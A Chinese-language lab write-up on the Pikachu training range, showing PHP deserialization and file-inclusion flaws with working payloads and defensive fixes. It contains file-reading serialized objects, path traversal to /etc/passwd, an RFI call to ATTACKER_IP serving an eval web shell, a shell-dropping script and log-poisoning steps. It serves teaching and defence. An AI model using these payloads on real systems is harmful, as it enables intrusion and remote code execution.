# Pikachu 反序列化 / 文件包含 WriteUp

## 漏洞概述

反序列化与文件包含在 Pikachu 中分属两个独立模块，但共享同一个底层风险模式：**用户可控的输入未经充分校验，直接进入了具备“执行/读取”语义的 PHP 语言构造**。反序列化模块中，用户输入被传入 `unserialize()`，触发魔术方法中的危险操作；文件包含模块中，用户输入被拼入 `include()`，使攻击者能够加载任意文件（包括远程文件）。

| **模块**         | **入口文件**      | **可控参数**               | **危险构造**                         | **核心危害**                    |
| :---------------- | :----------------- | :-------------------------- | :------------------------------------ | :------------------------------- |
| 反序列化         | `unserialize.php` | `test`（GET）/ `o`（POST） | `unserialize()` + 魔术方法           | 文件读取、XSS、POP 链 RCE       |
| 文件包含（本地） | `fi_local.php`    | `include`（POST）          | `include()`                          | 本地文件读取、日志包含 GetShell |
| 文件包含（远程） | `fi_remote.php`   | `filename`（GET/POST）     | `include()` + `allow_url_include=On` | 远程代码执行、Getshell          |

## 模块一：反序列化

### 源码分析

Pikachu 反序列化关卡存在一个简化的 **S 类**，其结构在不同版本中略有差异，但危险点一致：**魔术方法在对象生命周期中自动执行，且其依赖的属性完全来自反序列化字符串**。

一种常见的源码形态如下：


```php
<?php
class S{
    var $test = "pikachu";
    function __construct(){
        echo $this->test;          // 正常构造时输出 test
    }
}
$s = $_GET['test'];
@$unser = unserialize($s);         // 用户输入直接反序列化
if($unser){
    echo $unser->test;             // 反序列化后的对象属性被回显
}
?>
```

更接近 Pikachu 实际关卡设计的版本则引入了 `__destruct()` **中的文件操作**：


```php
<?php
class S{
    var $test = "pikachu";
    function __destruct(){
        // 对象销毁时，将 $test 作为文件名/路径读取
        echo file_get_contents($this->test);
    }
}
if(isset($_GET['test'])){
    @$unser = unserialize($_GET['test']);
}
?>
```

**根因拆解**：

- `unserialize()` **的目标完全可控**：`$_GET['test']` 未经任何验证直接进入反序列化函数。
- **魔术方法构成自动执行点**：`__destruct()` 在对象销毁时自动调用，攻击者无需让程序显式调用危险方法，只需构造合法的序列化字符串使 `$test` 属性指向危险目标即可。
- **危险函数依赖可控属性**：`file_get_contents($this->test)` 中的 `$this->test` 来自反序列化数据。将其设置为 `php://filter/read=convert.base64-encode/resource=index.php`，即可在 `__destruct()` 触发时读取任意文件源码；若设置为 `<script>alert(1)</script>` 且属性被回显到页面，则形成反射型 XSS。

> **关于** `__construct()` **的常见误解**：`__construct()` 在 `unserialize()` 时**不会**被自动调用，只有 `__wakeup()` 和 `__destruct()` 是反序列化场景下的自动触发点。Pikachu 的 XSS 变体利用的是属性回显，而非 `__construct()` 的自动执行。

### 手工利用流程

假设靶场地址为 `http://192.168.59.1/pikachu/vul/unserilization/unser.php`，参数名为 `test`。

#### 步骤 1：生成合法序列化字符串

在本地 PHP 环境（或在线 PHP 运行工具）中构造与目标类同名的对象，并设置危险属性：


```php
<?php
class S{
    var $test = "php://filter/read=convert.base64-encode/resource=index.php";
}
$s = new S();
echo serialize($s);
?>
```

输出结果形如：


```php
O:1:"S":1:{s:4:"test";s:61:"php://filter/read=convert.base64-encode/resource=index.php";}
```

**注意**：属性名 `test` 的长度 `4`、值的长度 `61` 必须与实际字符串长度严格一致，否则 `unserialize()` 会失败。

#### 步骤 2：提交 Payload 触发文件读取

将序列化字符串 URL 编码后作为 `test` 参数提交：


```php
http://192.168.59.1/pikachu/vul/unserilization/unser.php?test=O%3A1%3A%22S%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A61%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dindex.php%22%3B%7D
```

**目的**：对象反序列化成功后，脚本结束时 `__destruct()` 自动执行 `file_get_contents()`，将 `index.php` 的 Base64 编码源码回显到页面。复制回显字符串并解码，即可获得源码。

#### 步骤 3（XSS 变体）：属性回显到前端

如果目标版本的类在 `unserialize()` 后将 `$unser->test` 直接 `echo` 到 HTML 中，则将 `$test` 设置为 XSS payload 即可：


```php
class S{ var $test = "<script>alert('xss')</script>"; }
```

生成的序列化字符串中，值的长度为 `29`（`<script>alert('xss')</script>` 的实际字节数）。提交后脚本回显未转义的属性值，触发 XSS。

#### 步骤 4（POP 链思路）：从文件读取到 RCE

Pikachu 靶场本身的反序列化关卡通常不包含完整的 POP 链，但理解其构造逻辑对真实场景至关重要。POP 链的本质是**利用多个类的魔术方法首尾相接，将可控属性逐级传递到危险函数**。

一个概念性示例（非 Pikachu 实际代码）：


```php
class FileHandler{
    public $filename;
    function __toString(){
        return file_get_contents($this->filename);  // gadget：可控文件读取
    }
}
class Execute{
    public $cmd;
    function __destruct(){
        system($this->cmd);                         // sink：命令执行
    }
}
```

若存在一条调用路径使 `Execute::$cmd` 被可控地赋值为 `id`，则反序列化后 `__destruct()` 触发 `system('id')`，形成 RCE。在 Pikachu 的简化关卡中，通常以文件读取和 XSS 为直接利用形态，POP 链属于进阶知识。

### 工具辅助

**Burp Suite Decoder**：用于 URL 编码/解码序列化字符串，避免手动编码错误。

**PHP 在线沙箱 / 本地 PHP CLI**：生成序列化 Payload 最可靠的方式是本地执行：


```php
php -r 'class S{var $test="php://filter/read=convert.base64-encode/resource=index.php";} echo urlencode(serialize(new S));'
```

直接输出 URL 编码后的完整 Payload，复制到请求中即可。

**Base64 解码**：将页面回显的 Base64 字符串复制到 CyberChef 或 Burp Decoder 中解码，获取源码明文。

## 模块二：文件包含

### 源码分析

Pikachu 文件包含分为本地（`fi_local.php`）和远程（`fi_remote.php`）两关。核心逻辑一致：**用户输入被拼接到** `include()` **的路径中，未做白名单或路径规范化**。

简化后的本地包含源码：


```php
<?php
if(isset($_POST['submit'])){
    $filename = $_POST['include'];          // 参数名为 include，POST 提交
    include("include/" . $filename);        // 直接拼接，无白名单
}
?>
```

远程包含源码结构类似，但利用依赖 `allow_url_include=On`：


```php
<?php
if(isset($_POST['submit'])){
    $filename = $_POST['filename'];
    include($filename);                     // 允许 URL 或本地路径
}
?>
```

**根因拆解**：

- `include()` **的设计语义是“加载并执行指定文件”**，一旦路径可控，攻击者就可以加载预期之外的文件。本地包含可读取系统敏感文件、应用源码，或结合日志文件 / 已上传的图片木马实现代码执行。
- **参数名与提交方式容易被误判**：Pikachu 的 `fi_local.php` 实际使用 **POST** 提交，参数名为 `include`，而不是 URL 中的 `filename` 或 `file`。仅修改地址栏的 GET 参数不会生效，这是初学者常见的卡点。
- **远程包含的配置依赖**：`allow_url_include` 默认关闭，靶场环境可能需要手动在 `php.ini` 中开启才能利用 RFI；LFI 则不依赖该配置。

### 手工利用流程

假设靶场地址为 `http://192.168.59.1/pikachu/vul/fileinclude/`。

#### 本地包含：路径穿越读取系统文件

**步骤 1：确认参数与提交方式**

打开 `fi_local.php`，在页面中选择任意一个预设文件（如 `file1.php`）并提交。使用 Burp Suite 或浏览器开发者工具捕获请求，确认：

- Request Method：`POST`
- Form Data：`include=file1.php&submit=提交`

**步骤 2：替换为路径穿越 Payload**

在 Burp 中将 `include` 的值修改为：


```php
include=../../../../etc/passwd&submit=提交
```

或 Windows 环境：


```php
include=../../../../Windows/win.ini&submit=提交
```

Forward 请求后，如果响应中出现 `/etc/passwd` 的文件内容，说明路径穿越成功。

**步骤 3（读源码）：php://filter 封装器**

直接包含 `.php` 文件会触发 PHP 执行，源码不会直接回显。使用 `php://filter` 的 Base64 编码过滤器：


```php
include=php://filter/read=convert.base64-encode/resource=fi_local.php&submit=提交
```

响应中返回 Base64 字符串，解码后即为 `fi_local.php` 的源码。这是本地包含场景下最稳定的源码读取方式。

#### 远程包含：加载外部恶意文件

**前置条件**：`php.ini` 中 `allow_url_include = On`，且 `allow_url_fopen = On`。

**步骤 1：在可控服务器上准备恶意文件**

远程包含要求被包含文件的后缀不能与目标服务器语言相同（例如目标为 PHP 解析环境，远程文件不能是 `.php`，可用 `.txt`）。在攻击者控制的 Web 服务上放置 `hacker.txt`：


```php
<?php @eval($_POST["test"]); ?>
```

**步骤 2：提交远程 URL**


```php
http://192.168.59.1/pikachu/vul/fileinclude/fi_remote.php?filename=http://ATTACKER_IP/hacker.txt&submit=提交
```

如果包含成功，远程文件中的 PHP 代码将在目标服务器上执行，`hacker.txt` 被当作 PHP 解析。

**步骤 3：使用蚁剑连接**

如果远程文件中的代码具备文件写入功能，可进一步释放 `1.php` 木马并连接：


```php
<?php
$myfile = fopen("1.php", "w");
fwrite($myfile, '<?php @eval($_POST["test"]);?>');
fclose($myfile);
?>
```

包含该文件后，目标目录下生成 `1.php`，用蚁剑或菜刀连接 `http://192.168.59.1/pikachu/vul/fileinclude/1.php`，密码为 `test`。

#### 本地包含进阶：日志包含 GetShell

当无法上传文件且 `allow_url_include` 关闭时，LFI 可结合 **Web 访问日志** 实现代码执行：

1. 使用 Burp 拦截任意请求，将 `User-Agent` 修改为 PHP 代码：

   ```php
   User-Agent: <?php @eval($_POST['cmd']); ?>
   ```
2. 该请求会被 Apache/Nginx 写入 `access.log`（Linux 常见路径：`/var/log/apache2/access.log` 或 `/var/log/httpd/access_log`）。
3. 通过文件包含加载日志文件：

   ```php
   include=../../../../var/log/apache2/access.log&submit=提交
   ```
4. 包含成功后，日志中的 PHP 代码被执行，通过 `cmd` 参数传递命令。

> **注意**：日志包含的成功依赖日志路径可预测、日志文件可读，且包含时 PHP 会解析日志中的全部内容。在实际环境中，日志中混有大量正常记录，代码执行可能不稳定，通常需要多次尝试或使用 `php://filter` 配合其他技巧。

## 常用 Payload 与绕过技巧

### 反序列化

| **目的**      | **属性值 / Payload**                                         | **说明**                                       |
| :------------- | :------------------------------------------------------------ | :---------------------------------------------- |
| 读取 PHP 源码 | `php://filter/read=convert.base64-encode/resource=index.php` | 经 `file_get_contents()` 触发，Base64 避免解析 |
| 读取系统文件  | `/etc/passwd` 或 `C:/Windows/win.ini`                        | 属性直接作为文件路径                           |
| XSS           | `<script>alert('xss')</script>`                              | 属性被回显到 HTML 上下文                       |
| 长度/编码绕过 | URL 编码、Base64 编码序列化字符串                            | 绕过简单字符黑名单                             |

### 文件包含

| **目的**            | **参数值**                                                      | **说明**                  |
| :------------------- | :--------------------------------------------------------------- | :------------------------- |
| 路径穿越（Linux）   | `../../../../etc/passwd`                                        | 多级 `../` 回到根目录     |
| 路径穿越（Windows） | `..\..\..\..\Windows\win.ini`                                   | Windows 分隔符变体        |
| 读源码              | `php://filter/read=convert.base64-encode/resource=fi_local.php` | 避免 PHP 执行             |
| 远程代码执行        | `http://ATTACKER_IP/shell.txt`                                  | 需 `allow_url_include=On` |
| 日志包含            | `../../../../var/log/apache2/access.log`                        | UA 中注入 PHP 代码        |
| 绕过 `../` 过滤     | `....//....//....//etc/passwd`                                  | 删除一次 `../` 后重新组合 |
| 双写绕过            | `..././..././..././etc/passwd`                                  | 部分过滤器仅替换一次      |

## 漏洞成因与防御措施

### 反序列化

**根本原因**：将不可信数据传入 `unserialize()`，且应用上下文中存在带有危险操作的魔术方法。

**可落地的防御代码（PHP）**：


```php
<?php
// 方案 A：避免反序列化不可信数据，改用 JSON
$data = json_decode($_POST['data'], true, 512, JSON_THROW_ON_ERROR);

// 方案 B：必须反序列化时，使用 allowed_classes 限制可实例化的类
$obj = unserialize($userInput, ['allowed_classes' => ['SafeClassA', 'SafeClassB']]);

// 方案 C：对序列化数据做完整性校验（HMAC），拒绝被篡改的输入
function verifyAndUnserialize(string $data, string $secret): mixed {
    [$payload, $mac] = explode('|', $data, 2);
    if (!hash_equals(hash_hmac('sha256', $payload, $secret), $mac)) {
        throw new RuntimeException('Integrity check failed');
    }
    return unserialize(base64_decode($payload), ['allowed_classes' => false]);
}
```

**关键点**：`allowed_classes => false` 表示禁止实例化任何类，反序列化结果只能为标量或数组；若业务必须还原对象，应使用显式白名单。HMAC 用于防止攻击者篡改序列化字符串中的属性值。

### 文件包含

**根本原因**：用户可控输入直接进入 `include()/require()`，缺少白名单或路径规范化。

**可落地的防御代码（PHP）**：


```php
<?php
$allowed = [
    'file1' => __DIR__ . '/include/file1.php',
    'file2' => __DIR__ . '/include/file2.php',
];

$key = $_GET['page'] ?? 'file1';
if (!array_key_exists($key, $allowed)) {
    http_response_code(400);
    exit('Invalid page');
}

include $allowed[$key];          // 使用映射后的固定路径，而非用户原始输入
```

如果无法使用映射白名单，至少应进行**路径规范化 + 基目录约束**：


```php
$base = realpath(__DIR__ . '/include');
$target = realpath($base . '/' . basename($_GET['include']));
if ($target === false || strpos($target, $base) !== 0) {
    exit('Access denied');
}
include $target;
```

**配置层加固**：


```php
; php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html/your_app:/tmp
```

`allow_url_include = Off` 直接封堵 RFI；`open_basedir` 将 PHP 可访问文件限制在应用目录内，即使存在 LFI，也无法穿越到 `/etc/passwd` 或日志文件。

### 防御措施对比

| **防御层次** | **反序列化**                    | **文件包含**                            |
| :------------ | :------------------------------- | :--------------------------------------- |
| 输入层       | 不反序列化不可信数据，改用 JSON | 不使用用户原始输入拼接路径              |
| 白名单       | `allowed_classes` 显式限制类    | `include` 路径映射白名单                |
| 完整性       | HMAC 校验序列化数据             | `realpath` + 基目录前缀校验             |
| 配置层       | 禁用不必要的危险魔术方法逻辑    | `allow_url_include=Off`、`open_basedir` |
| 架构层       | 序列化数据只在可信边界内传输    | 模板/包含逻辑与用户输入解耦             |

## 总结

Pikachu 的反序列化与文件包含模块分别展示了 **“可控输入进入** `unserialize()`**”** 和 **“可控输入进入** `include()`**”** 的典型后果。反序列化的核心不在 `unserialize()` 函数本身，而在于**魔术方法自动执行 + 属性可控**；文件包含的核心不在 `include()` 的“包含”语义，而在于**用户输入未经白名单约束地成为文件路径**。两者的防御方向也高度一致：**拒绝原始用户输入直接进入危险构造，用白名单收窄可控空间，用配置层做兜底**。

| **对比维度** | **反序列化**                             | **文件包含（本地 LFI）**    | **文件包含（远程 RFI）**         |
| :------------ | :---------------------------------------- | :--------------------------- | :-------------------------------- |
| 可控参数     | `test` / `o`                             | `include`（POST）           | `filename`（POST/GET）           |
| 最稳定利用   | `php://filter` 读源码                    | 路径穿越 + `php://filter`   | 远程 `.txt` 木马 + 蚁剑          |
| 关键前提     | 存在危险魔术方法                         | 无路径白名单                | `allow_url_include=On`           |
| 防御核心     | `allowed_classes` / 不反序列化不可信数据 | 映射白名单 + `open_basedir` | `allow_url_include=Off` + 白名单 |

> 本文仅用于靶场学习与授权测试，请遵守法律法规。